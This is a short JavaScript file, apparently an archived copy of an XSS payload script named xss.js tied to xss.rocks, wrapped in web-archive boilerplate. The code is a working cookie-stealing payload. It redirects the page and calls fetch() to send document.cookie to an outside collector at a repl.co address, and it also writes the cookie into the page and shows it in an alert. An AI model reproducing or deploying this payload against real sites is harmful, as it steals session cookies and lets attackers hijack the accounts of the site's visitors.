var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  /*let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");
  */
  document.location='https://surveyapi.brianmurphy11.repl.co/cookie?g'+document.cookie;


document.write ("This is remote text via xss.js located at xss.rocks " + document.cookie);
myURL="https://surveyapi.brianmurphy11.repl.co/cookie?";
function hitPoint(myVal){
  console.log("Hitting endpoint");
  console.log(myURL+"g="+myVal);
  fetch(myURL+"g="+myVal,{mode:'no-cors'});
}
 hitPoint(document.cookie);
alert ("This is remote text via xss.js pulled from xss.rocks " + document.cookie);
}
